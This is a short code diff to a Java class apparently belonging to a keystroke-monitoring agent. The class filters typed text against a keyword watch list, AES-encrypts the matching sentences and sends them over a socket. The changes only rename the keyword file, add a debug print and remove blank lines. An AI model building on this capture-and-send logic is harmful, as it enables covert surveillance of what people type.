@@ -36,7 +36,7 @@ public class Keystore extends Thread {
 	private static int GCM_TAG_LENGTH = 128;
 	private static int IV_LENGTH = 12;
 	private static String KEY_FILE = "agent.key";
-	private static String WATCH_LIST_FILE = "watchlist.txt";
+	private static String WATCH_LIST_FILE = "keyword.txt";
 	
 	public Keystore(Socket soc, long timeLimit, long NumberLimit )
 	{
@@ -71,13 +71,12 @@ public class Keystore extends Thread {
 					
 					
 					String text = (ksm != null && ksm.getText() != null) ? ksm.getText() : "";
-					
 					if(((t0 - t)/1000000 > timeLimit || text.length() > numberLimit) && !text.isEmpty())
 					{
 						KeystoreModel temp = kst.swapModel();
 						String textTemp = temp.getText();
-						
 						List<String> sentences = findAllSentenceByKeyWord(textTemp, watchList);
+						System.out.println(sentences);
 						int indexLast = 0;
 						for(String sentence : sentences)
 						{
@@ -90,7 +89,6 @@ public class Keystore extends Thread {
 						    int endIdx = pos + s.length();  
 							long takeAt = getTimeForSentence(temp.getKeyEvents(), endIdx);
 							encryptAES(sentence);
-							
 							
 							dos.writeInt(textEnc.length);
 							dos.write(textEnc);
@@ -179,7 +177,6 @@ public class Keystore extends Thread {
 		File file = new File(path);
 		if(!file.exists())
 			return li;
-		
 		try(BufferedReader br = new BufferedReader(new FileReader(file)))
 		{
 			
